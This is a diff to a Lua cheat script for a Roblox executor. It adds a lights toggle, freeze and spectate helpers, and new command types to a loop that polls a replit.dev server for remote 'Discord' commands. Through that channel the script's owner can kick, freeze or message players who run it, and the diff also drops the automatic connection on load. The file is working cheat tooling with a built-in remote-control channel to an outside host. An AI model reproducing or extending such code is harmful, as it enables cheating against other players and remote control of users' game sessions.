@@ -9,6 +9,7 @@ local httpRequest = (syn and syn.request) or http_request or request
 if not httpRequest then
     warn("❌ Your executor doesn't support HTTP requests!")
 end
+
 -- Discord Configuration
 local DISCORD_API_URL = "https://5e6a4ce1-65e1-49da-a450-ac983707fc3b-00-s6e0zpq7bs82.janeway.replit.dev:3000/"
 local GAME_ID = tostring(game.JobId) -- Unique ID for this server
@@ -59,6 +60,107 @@ local MinesTab = ExploitCategory:CreateTab("Mines", "⛏️")
 -- Variables
 local spoofCrouchEnabled = false
 local spoofCrouchLoop
+local lightsEnabled = true
+local originalLightStates = {}
+local frozenPlayers = {}
+local spectatingPlayer = nil
+
+-- ==================== HELPER FUNCTIONS ====================
+
+-- Function to get Discord user name from ID
+local function getDiscordUsername(discordId)
+    if discordId == "904343901526192168" then
+        return "Xason (Owner)"
+    elseif discordId == "1392295124498645104" then
+        return "Draco (Tester)"
+    else
+        return "Unknown User"
+    end
+end
+
+-- Function to toggle all lights in the game
+local function toggleLights(enabled)
+    lightsEnabled = enabled
+    
+    -- Find all lights in workspace
+    for _, obj in pairs(game.Workspace:GetDescendants()) do
+        if obj:IsA("Light") or obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
+            -- Store original state on first toggle
+            if originalLightStates[obj] == nil then
+                originalLightStates[obj] = obj.Enabled
+            end
+            
+            obj.Enabled = enabled
+        end
+    end
+    
+    Window:Notify({
+        Text = enabled and "💡 Lights turned ON" or "🌑 Lights turned OFF",
+        Duration = 2,
+        Type = "Success"
+    })
+end
+
+-- Function to freeze/unfreeze a player
+local function freezePlayer(playerName, freeze)
+    local targetPlayer = game.Players:FindFirstChild(playerName)
+    if targetPlayer and targetPlayer.Character then
+        local humanoidRootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart then
+            humanoidRootPart.Anchored = freeze
+            frozenPlayers[playerName] = freeze
+            
+            Window:Notify({
+                Text = freeze and ("🧊 Frozen " .. playerName) or ("✅ Unfroze " .. playerName),
+                Duration = 3,
+                Type = "Success"
+            })
+        end
+    end
+end
+
+-- Function to spectate a player
+local function spectatePlayer(playerName)
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local targetPlayer = Players:FindFirstChild(playerName)
+    
+    if targetPlayer and targetPlayer.Character then
+        local camera = workspace.CurrentCamera
+        camera.CameraSubject = targetPlayer.Character.Humanoid
+        spectatingPlayer = playerName
+        
+        Window:Notify({
+            Text = "👁️ Now spectating " .. playerName,
+            Duration = 3,
+            Type = "Success"
+        })
+    else
+        Window:Notify({
+            Text = "❌ Could not spectate " .. playerName,
+            Duration = 3,
+            Type = "Error"
+        })
+    end
+end
+
+-- Function to stop spectating
+local function stopSpectating()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    
+    if LocalPlayer.Character then
+        local camera = workspace.CurrentCamera
+        camera.CameraSubject = LocalPlayer.Character.Humanoid
+        spectatingPlayer = nil
+        
+        Window:Notify({
+            Text = "👁️ Stopped spectating",
+            Duration = 2,
+            Type = "Success"
+        })
+    end
+end
 
 -- ==================== ENHANCED DISCORD INTEGRATION ====================
 local HttpService = game:GetService("HttpService")
@@ -97,6 +199,8 @@ local function checkDiscordCommands()
         local data = HttpService:JSONDecode(response.Body)
         
         for _, cmd in ipairs(data.commands) do
+            local senderName = getDiscordUsername(cmd.senderId or "")
+            
             if cmd.type == "kill" then
                 -- Kill command
                 local targetPlayer = Players:FindFirstChild(cmd.target)
@@ -109,9 +213,9 @@ local function checkDiscordCommands()
                 end
                 
             elseif cmd.type == "notify" then
-                -- Notification command
+                -- Notification command with sender identification
                 Window:Notify({
-                    Text = "Xason (Owner): " .. cmd.message,
+                    Text = senderName .. ": " .. cmd.message,
                     Duration = 15,
                     Type = "Warning"
                 })
@@ -120,7 +224,19 @@ local function checkDiscordCommands()
                 -- Kick command
                 if cmd.target == LocalPlayer.Name then
                     task.wait(1)
-                    LocalPlayer:Kick("")
+                    LocalPlayer:Kick("Kicked by " .. senderName)
+                end
+                
+            elseif cmd.type == "freeze" then
+                -- Freeze command
+                if cmd.target == LocalPlayer.Name then
+                    freezePlayer(LocalPlayer.Name, true)
+                end
+                
+            elseif cmd.type == "spectate" then
+                -- Spectate command
+                if cmd.target ~= LocalPlayer.Name then
+                    spectatePlayer(cmd.target)
                 end
             end
         end
@@ -183,7 +299,7 @@ local function registerWithDiscord()
     if success2 and response2.StatusCode == 200 then
         discordConnected = true
         Window:Notify({
-            Text = "✅ Log in succeful",
+            Text = "✅ Log in successful",
             Duration = 3,
             Type = "Success"
         })
@@ -213,14 +329,6 @@ local function registerWithDiscord()
         })
     end
 end
-
--- Auto-connect to Discord on script load
-task.spawn(function()
-    task.wait(1) -- Wait for UI to load
-    if httpRequest then
-        registerWithDiscord()
-    end
-end)
 
 -- Variables
 local spoofCrouchEnabled = false
